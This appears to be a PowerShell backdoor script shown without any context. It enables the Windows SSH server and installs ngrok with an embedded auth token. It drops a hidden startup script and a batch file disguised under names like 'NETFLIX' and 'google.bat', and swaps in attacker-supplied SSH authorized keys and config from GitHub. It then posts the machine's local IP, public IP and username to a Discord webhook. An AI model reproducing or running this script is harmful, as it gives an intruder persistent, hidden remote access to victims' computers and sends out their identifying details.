Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0; Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0; Start-Service sshd; Set-Service -Name sshd -StartupType 'Automatic'; Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1')); choco install ngrok -y; ngrok config add-authtoken 2Zm58ahROcrPwJl32wKOlvBF26L_25CJ2HEkvkph2QBHLXitV; cd "C:\ProgramData";Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/NETFLIX/main/google.bat; cd "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; Start-BitsTransfer "https://raw.githubusercontent.com/2o2ks/NETFLIX/main/startup.vbs"; $path = "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\startup.vbs"; Set-ItemProperty -Path $path -Name Attributes -Value ([IO.FileAttributes]::Hidden); cd C:\ProgramData\ssh ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/administrators_authorized_keys } ; if ($?) { Start-BitsTransfer https://raw.githubusercontent.com/2o2ks/ZeroTier2/main/sshd_config }; Restart-Service sshd; cd "$HOME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"; .\startup.vbs;


$publicIpAddress = Invoke-RestMethod -Uri "https://ipinfo.io/ip"

$ipAddress = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
$user = $env:USERNAME

$url = "https://discord.com/api/webhooks/1186839699998900224/maAvNFQo7zAuyMb1LUTewrGxSEXMW8XO2iqSgvngflsXlMSJ-ZhErKINHUHfCA5z0pv_"

$jsonBody = @{
     content = "
 ```IP:        $ipAddress | $publicIpAddress     HOSTNAME:     $user```
 "
 } | ConvertTo-Json

 Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json"
 

